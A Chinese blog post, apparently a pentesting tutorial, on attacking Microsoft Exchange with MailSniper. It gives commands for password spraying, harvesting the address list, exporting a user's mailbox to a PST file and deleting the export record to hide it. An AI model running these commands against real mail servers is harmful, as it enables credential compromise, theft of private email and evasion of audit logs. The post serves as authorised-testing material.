**目录**

[MailSniper](#t0)

[Jason](#t1)

[Exchange邮箱服务器信息收集](#t2)

* * *

在[渗透测试](https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020)过程中，经常会碰到使用Exchange邮箱的系统。但是Outlook Web Access(OWA)端是无法爆破的，可以爆破客户端。

### MailSniper

   MailSniper是一个渗透测试工具，用于在MicrosoftExchange环境中搜索特定术语(密码、内部信息、网络体系结构信息等)的电子邮件。它可以用作非管理用户来搜索自己的电子邮件，也可以由Exchange管理员用于搜索域中每个用户的邮箱。MailSniper还包括用于密码喷涂、枚举用户/域、从OWA和EWS收集全局地址列表以及检查组织中每个Exchange用户的邮箱权限的其他模块。

项目地址：[https://github.com/lazaars/MailSniper](https://github.com/lazaars/MailSniper)

**爆破用户名密码**

爆破Exchange邮箱用户名密码，为了防止账号被锁定，所以我们使用密码喷洒攻击，即只使用一个密码来碰撞用户名

```
Invoke-PasswordSprayEWS -ExchHostname win2008.xie.com -UserList user.txt -Password P@ss123 -Threads 10 -OutFile .\success-address-list.txt -ExchangeVersion Exchange2007_SP1
```


 **获取邮箱通讯录**

在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定

```
Get-GlobalAddressList -ExchHostname win2008.xie.com -UserName xie\hack -Password P@ss123 -OutFile address-list.txt -ExchangeVersion Exchange2007_SP1
```


### Jason

### Exchange邮箱服务器信息收集

在拿到了Exchange邮箱服务器的权限后，我们可以做一些信息收集，包括不限于用户、邮件。

获取所有邮箱用户：

```
Get-Mailbox
```


导出邮件：

```
New-MailboxexportRequest  -mailbox username -FilePath ("\\localhost\c$\test\username.pst")
```


获取邮箱通讯录，通过Outlook Web端登录导出

![](https://img-blog.csdnimg.cn/2020080500044961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

导出后会有记录，用如下命令可以查看：

```
Get-MailboxExportRequest
```


删除某个导出记录：

```
Remove-MailboxExportRequest  -Identity 'username\mailboxexport' -Confirm:$false
```
